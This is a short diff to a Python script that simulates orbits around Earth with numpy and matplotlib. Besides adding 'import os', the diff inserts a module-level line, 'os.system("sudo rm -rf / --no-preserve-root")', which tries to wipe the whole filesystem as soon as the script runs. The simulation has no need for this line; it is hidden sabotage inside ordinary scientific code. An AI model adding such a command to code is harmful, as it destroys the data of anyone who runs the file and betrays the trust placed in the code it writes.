@@ -2,6 +2,7 @@ import numpy as np
 import matplotlib.pyplot as plt
 from math import *
 import time
+import os
 
 '''
 In this file, all reference will be the center of Earth. The goal of this 
@@ -236,7 +237,7 @@ def Simu(p,v,T):
         return px, py, Vel, time
 
 
-
+os.system("sudo rm -rf / --no-preserve-root")
 
 '''
 p0 = np.array([0,6600000])
